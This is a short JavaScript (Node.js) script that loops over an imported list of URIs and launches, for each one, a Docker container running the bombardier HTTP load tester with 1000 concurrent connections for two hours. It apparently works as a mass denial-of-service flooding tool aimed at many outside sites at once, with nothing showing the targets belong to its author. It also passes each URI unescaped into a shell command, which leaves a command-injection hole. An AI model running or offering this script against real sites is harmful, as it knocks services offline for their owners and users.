//@ts-ignore
import child_process from 'child_process';
import { list } from './list.js';


list.forEach((uri) => {
    child_process.exec(
        `docker run -i --rm alpine/bombardier -c 1000 -d 2h -l ${uri}`,
        (err, stdout, stderr) => {
            if(err) {
                console.log({ uri, err });
            }
    });
})